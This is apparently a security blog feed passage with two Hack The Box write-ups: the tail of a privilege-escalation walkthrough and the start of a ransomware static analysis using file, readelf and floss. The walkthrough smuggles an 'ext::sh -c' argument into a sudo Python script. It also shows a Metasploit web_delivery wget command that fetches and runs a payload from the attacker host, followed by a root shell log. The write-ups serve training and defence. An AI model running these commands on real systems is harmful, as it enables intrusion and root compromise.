<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span style="color:#f1fa8c">&#39;ext::sh -c /home/prod/kKqgpCZC&#39;</span>
</span></span></code></pre></div><p>Metasploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Run the following <span style="color:#8be9fd;font-style:italic">command</span> on the target machine:
</span></span><span style="display:flex;"><span>wget -qO kKqgpCZC --no-check-certificate http://10.10.14.50:8080/DHmVwiq; chmod +x kKqgpCZC; ./kKqgpCZC&amp; <span style="color:#8be9fd;font-style:italic">disown</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.145    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> 10.129.76.146    web_delivery - Delivering Payload <span style="color:#ff79c6">(</span><span style="color:#bd93f9">250</span> bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">38</span> bytes<span style="color:#ff79c6">)</span> to 10.129.76.146
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command shell session <span style="color:#bd93f9">3</span> opened <span style="color:#ff79c6">(</span>10.10.14.50:4444 -&gt; 10.129.76.146:34428<span style="color:#ff79c6">)</span> at 2024-06-18 18:33:50 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Active <span style="color:#8be9fd;font-style:italic">sessions</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Id  Name  Type             Information  Connection
</span></span><span style="display:flex;"><span>  --  ----  ----             -----------  ----------
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">3</span>         shell x64/linux               10.10.14.50:4444 -&gt; 10.129.76.146:34428 <span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>                                          10.129.76.146<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/script/web_delivery<span style="color:#ff79c6">)</span> &gt; sessions -i <span style="color:#bd93f9">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Starting interaction with 3...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>We successfully rooted the box.</p>
]]></description></item><item><title>HTB Sherlock Lockpick1</title><link>https://hshakilst.github.io/posts/htb-sherlocks/lockpick1/</link><pubDate>Sat, 15 Jun 2024 04:33:24 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/lockpick1/</guid><description><![CDATA[<h1 id="lockpick-1---malware-analysis">Lockpick 1 - Malware Analysis</h1>
<h3 id="scenario">Scenario</h3>
<p>Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>lockpick1.zip</td>
<td>e14430ea647d948e3084931652f5e534</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>bescrypt.zip</td>
<td>ab7388c8a51ea6c8b53cbc11bfd463f2</td>
<td>E@iwyzXK7HK&amp;</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li><a href="https://github.com/mandiant/flare-floss">flare-floss</a>: For static malware analysis.</li>
<li><a href="https://github.com/jqlang/jq">jq</a>: For querying JSON files.</li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra SRE</a>: For reverse engineering the malware and static analysis.</li>
<li>Sublime Text Editor</li>
<li>xxd Hex Editor</li>
<li>Visual Studio Code</li>
</ul>
<h3 id="tasks">Tasks</h3>
<ol>
<li>Please confirm the encryption key string utilised for the encryption of the files provided?</li>
<li>We have recently received an email from <a href="mailto:wbevansn1@cocolog-nifty.com">wbevansn1@cocolog-nifty.com</a> demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant.</li>
<li>What is the MAC address and serial number of the laptop assigned to Hart Manifould?</li>
<li>What is the email address of the attacker?</li>
<li>City of London Police have suspiciouns of some insider trading taking part within our trading organisation. Please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage.</li>
<li>Our E-Discovery team would like to confirm the IP address detailed in the Sales Forecast log for a user who is suspected of sharing their account with a colleague. Please confirm the IP address for Karylin O&rsquo;Hederscoll.</li>
<li>Which of the following file extensions is not targeted by the malware? <code>.txt, .sql, .ppt, .pdf, .docx, .xlsx, .csv, .json, .xml</code></li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the applicants DB.</li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the trading backup.</li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the complaints file.</li>
</ol>
<h3 id="malware-analysis">Malware Analysis</h3>
<p>We have been given a directory <code>forela-criticaldata</code> that contains encrypted internal files by a ransomware. The sample of the ransomware is also given in a separate zip file <code>bescrypt.zip</code>. Our objective is to recover the encrypted files by analyzing the malware.</p>
<h4 id="static-analysis">Static Analysis</h4>
<p>First, let&rsquo;s see what kind of binary we are dealing with.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ file bescrypt3.2               
</span></span><span style="display:flex;"><span>bescrypt3.2: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>SYSV<span style="color:#ff79c6">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#ff79c6">[</span>sha1<span style="color:#ff79c6">]=</span>2b6eafade391d7be39a8aff0d2e3a60aa8b6a4c2, <span style="color:#ff79c6">for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p>It&rsquo;s an ELF 64-bit binary. You can read more about ELF binary in the Medium article mentioned in the reference section.</p>
<p>Binary Headers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -h bescrypt3.2
</span></span><span style="display:flex;"><span>ELF Header:
</span></span><span style="display:flex;"><span>  Magic:   7f <span style="color:#bd93f9">45</span> 4c <span style="color:#bd93f9">46</span> <span style="color:#bd93f9">02</span> <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> 
</span></span><span style="display:flex;"><span>  Class:                             ELF64
</span></span><span style="display:flex;"><span>  Data:                              2&#39;s complement, little endian
</span></span><span style="display:flex;"><span>  Version:                           <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>current<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  OS/ABI:                            UNIX - System V
</span></span><span style="display:flex;"><span>  ABI Version:                       <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>  Type:                              DYN <span style="color:#ff79c6">(</span>Position-Independent Executable file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Machine:                           Advanced Micro Devices X86-64
</span></span><span style="display:flex;"><span>  Version:                           0x1
</span></span><span style="display:flex;"><span>  Entry point address:               0x1160
</span></span><span style="display:flex;"><span>  Start of program headers:          <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes into file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Start of section headers:          <span style="color:#bd93f9">14904</span> <span style="color:#ff79c6">(</span>bytes into file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Flags:                             0x0
</span></span><span style="display:flex;"><span>  Size of this header:               <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Size of program headers:           <span style="color:#bd93f9">56</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Number of program headers:         <span style="color:#bd93f9">13</span>
</span></span><span style="display:flex;"><span>  Size of section headers:           <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Number of section headers:         <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>  Section header string table index: <span style="color:#bd93f9">30</span>
</span></span></code></pre></div><p>Let&rsquo;s use floss and try to dump the strings of the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ floss bescrypt3.2 --format sc64
</span></span><span style="display:flex;"><span>INFO: floss: extracting static strings
</span></span><span style="display:flex;"><span>finding decoding <span style="color:#ff79c6">function</span> features: 100%|âââââ| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 498.08 functions/s, skipped <span style="color:#bd93f9">0</span> library functions<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.stackstrings: extracting stackstrings from <span style="color:#bd93f9">1</span> functions
</span></span><span style="display:flex;"><span>extracting stackstrings: 100%|âââââââââââââââââââââââââââââââââââââââââââââ| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 151.76 functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.tightstrings: extracting tightstrings from <span style="color:#bd93f9">0</span> functions...
</span></span><span style="display:flex;"><span>extracting tightstrings: <span style="color:#bd93f9">0</span> functions <span style="color:#ff79c6">[</span>00:00, ? functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.string_decoder: decoding strings
</span></span><span style="display:flex;"><span>decoding strings: 100%|ââââââââââââââââââââââââââââââââââââââââââââââââââââ| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 289.22 functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss: finished execution after 3.23 seconds
</span></span><span style="display:flex;"><span>INFO: floss: rendering results
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLARE FLOSS RESULTS <span style="color:#ff79c6">(</span>version 3.1.0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+------------------------+------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| file path              | bescrypt3.2                                                                        |
</span></span><span style="display:flex;"><span>| identified language    | unknown                                                                            |
</span></span><span style="display:flex;"><span>| extracted strings      |                                                                                    |
</span></span><span style="display:flex;"><span>|  static strings        | <span style="color:#bd93f9">127</span> <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1700</span> characters<span style="color:#ff79c6">)</span>                                                              |
</span></span><span style="display:flex;"><span>|   language strings     |   <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">(</span>   <span style="color:#bd93f9">0</span> characters<span style="color:#ff79c6">)</span>                                                              |
</span></span><span style="display:flex;"><span>|  stack strings         | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>|  tight strings         | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>|  decoded strings       | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>+------------------------+------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> ââââââââââââââââââââââââââââ 
</span></span><span style="display:flex;"><span>  FLOSS STATIC STRINGS <span style="color:#ff79c6">(</span>127<span style="color:#ff79c6">)</span>  
</span></span><span style="display:flex;"><span> ââââââââââââââââââââââââââââ 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+-----------------------------------+
</span></span><span style="display:flex;"><span>| FLOSS STATIC STRINGS: ASCII <span style="color:#ff79c6">(</span>127<span style="color:#ff79c6">)</span> |
</span></span><span style="display:flex;"><span>+-----------------------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>rewind
</span></span><span style="display:flex;"><span>snprintf
</span></span><span style="display:flex;"><span>free
</span></span><span style="display:flex;"><span>fread
</span></span><span style="display:flex;"><span>closedir
</span></span><span style="display:flex;"><span>fopen
</span></span><span style="display:flex;"><span>strlen
</span></span><span style="display:flex;"><span>strstr
</span></span><span style="display:flex;"><span>malloc
</span></span><span style="display:flex;"><span>__libc_start_main
</span></span><span style="display:flex;"><span>remove
</span></span><span style="display:flex;"><span>__cxa_finalize
</span></span><span style="display:flex;"><span>ftell
</span></span><span style="display:flex;"><span>readdir
</span></span><span style="display:flex;"><span>fclose
</span></span><span style="display:flex;"><span>opendir
</span></span><span style="display:flex;"><span>fwrite
</span></span><span style="display:flex;"><span>strcmp
</span></span><span style="display:flex;"><span>fseek
</span></span><span style="display:flex;"><span>libc.so.6
</span></span><span style="display:flex;"><span>GLIBC_2.34
</span></span><span style="display:flex;"><span>GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
</span></span><span style="display:flex;"><span>__gmon_start__
</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
</span></span><span style="display:flex;"><span>PTE1
</span></span><span style="display:flex;"><span>u+UH
</span></span><span style="display:flex;"><span>ATSH
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>A<span style="color:#f1fa8c">\]</span>
</span></span><span style="display:flex;"><span>Error opening file: %s
</span></span><span style="display:flex;"><span>%s.24bes
</span></span><span style="display:flex;"><span>%s_note.txt
</span></span><span style="display:flex;"><span>This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment <span style="color:#ff79c6">for</span> us providing you the decryption software..
</span></span><span style="display:flex;"><span>Error creating note file: %s
</span></span><span style="display:flex;"><span>Error deleting original file: %s
</span></span><span style="display:flex;"><span>Error opening directory: %s
</span></span><span style="display:flex;"><span>%s/%s
</span></span><span style="display:flex;"><span>.txt
</span></span><span style="display:flex;"><span>.sql
</span></span><span style="display:flex;"><span>.pdf
</span></span><span style="display:flex;"><span>.docx
</span></span><span style="display:flex;"><span>.xlsx
</span></span><span style="display:flex;"><span>.csv
</span></span><span style="display:flex;"><span>.json
</span></span><span style="display:flex;"><span>.xml
</span></span><span style="display:flex;"><span>Encrypting: %s
</span></span><span style="display:flex;"><span>bhUlIshutrea98liOp
</span></span><span style="display:flex;"><span>/forela-criticaldata/
</span></span><span style="display:flex;"><span>;*3$<span style="color:#f1fa8c">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">GCC: (Debian 12.2.0-13) 12.2.0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Scrt1.o
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__abi_tag
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">crtstuff.c
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">deregister_tm_clones
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__do_global_dtors_aux
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">completed.0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__do_global_dtors_aux_fini_array_entry
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">frame_dummy
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__frame_dummy_init_array_entry
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">bescrypt2.c
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__FRAME_END__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_DYNAMIC
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__GNU_EH_FRAME_HDR
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_GLOBAL_OFFSET_TABLE_
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">free@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__libc_start_main@GLIBC_2.34
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">remove@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_ITM_deregisterTMCloneTable
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fread@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_edata
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fclose@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">opendir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_fini
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strlen@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rewind@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">snprintf@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">closedir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__data_start
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strcmp@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ftell@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__gmon_start__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__dso_handle
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_IO_stdin_used
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">readdir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">malloc@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_end
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fseek@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__bss_start
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">main
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">encrypt_file
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">process_directory
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fopen@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fwrite@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__TMC_END__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_ITM_registerTMCloneTable
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__cxa_finalize@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_init
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strstr@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.symtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.strtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.shstrtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.interp
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.gnu.property
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.gnu.build-id
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.ABI-tag
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.hash
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynsym
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynstr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.version
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.version_r
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rela.dyn
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rela.plt
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.init
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.plt.got
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.fini
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rodata
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.eh_frame_hdr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.eh_frame
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.init_array
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.fini_array
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynamic
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.got.plt
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.data
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.bss
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.comment
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">+------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">| FLOSS STATIC STRINGS: UTF-16LE (0) |
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">+------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââ 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS STACK STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââ 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââ 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS TIGHT STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââ 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââââ 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS DECODED STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> âââââââââââââââââââââââââââ 
</span></span></span></code></pre></div><p>We can see the structure of the ELF binary, the function names it has, and some hard coded strings. Most Interesting ones are listed below:</p>
<p>Hard coded strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Error opening file: %s
</span></span><span style="display:flex;"><span>%s.24bes
</span></span><span style="display:flex;"><span>%s_note.txt
</span></span><span style="display:flex;"><span>This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..
</span></span><span style="display:flex;"><span>Error creating note file: %s
</span></span><span style="display:flex;"><span>Error deleting original file: %s
</span></span><span style="display:flex;"><span>Error opening directory: %s
</span></span><span style="display:flex;"><span>%s/%s
</span></span><span style="display:flex;"><span>.txt
</span></span><span style="display:flex;"><span>.sql
</span></span><span style="display:flex;"><span>.pdf
</span></span><span style="display:flex;"><span>.docx
</span></span><span style="display:flex;"><span>.xlsx
</span></span><span style="display:flex;"><span>.csv
</span></span><span style="display:flex;"><span>.json
</span></span><span style="display:flex;"><span>.xml
</span></span><span style="display:flex;"><span>Encrypting: %s
</span></span><span style="display:flex;"><span>bhUlIshutrea98liOp
</span></span><span style="display:flex;"><span>/forela-criticaldata/
</span></span></code></pre></div><p>We found the encryption key which is <code>bhUlIshutrea98liOp</code>. Now, we need to figure out what kind of encryption we are dealing with.</p>
<p>C header files and functions load order:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>GCC: (Debian 12.2.0-13) 12.2.0
</span></span><span style="display:flex;"><span>Scrt1.o
</span></span><span style="display:flex;"><span>__abi_tag
</span></span><span style="display:flex;"><span>crtstuff.c
</span></span><span style="display:flex;"><span>deregister_tm_clones
</span></span><span style="display:flex;"><span>__do_global_dtors_aux
</span></span><span style="display:flex;"><span>completed.0
</span></span><span style="display:flex;"><span>__do_global_dtors_aux_fini_array_entry
</span></span><span style="display:flex;"><span>frame_dummy
</span></span><span style="display:flex;"><span>__frame_dummy_init_array_entry
</span></span><span style="display:flex;"><span>bescrypt2.c
</span></span><span style="display:flex;"><span>__FRAME_END__
</span></span><span style="display:flex;"><span>_DYNAMIC
</span></span><span style="display:flex;"><span>__GNU_EH_FRAME_HDR
</span></span><span style="display:flex;"><span>_GLOBAL_OFFSET_TABLE_
</span></span><span style="display:flex;"><span>free@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__libc_start_main@GLIBC_2.34
</span></span><span style="display:flex;"><span>remove@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
</span></span><span style="display:flex;"><span>fread@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_edata
</span></span><span style="display:flex;"><span>fclose@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>opendir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_fini
</span></span><span style="display:flex;"><span>strlen@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>rewind@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>snprintf@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>closedir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__data_start
</span></span><span style="display:flex;"><span>strcmp@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>ftell@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__gmon_start__
</span></span><span style="display:flex;"><span>__dso_handle
</span></span><span style="display:flex;"><span>_IO_stdin_used
</span></span><span style="display:flex;"><span>readdir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>malloc@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_end
</span></span><span style="display:flex;"><span>fseek@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__bss_start
</span></span><span style="display:flex;"><span>main
</span></span><span style="display:flex;"><span>encrypt_file
</span></span><span style="display:flex;"><span>process_directory
</span></span><span style="display:flex;"><span>fopen@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>fwrite@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__TMC_END__
</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
</span></span><span style="display:flex;"><span>__cxa_finalize@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_init
</span></span><span style="display:flex;"><span>strstr@GLIBC_2.2.5
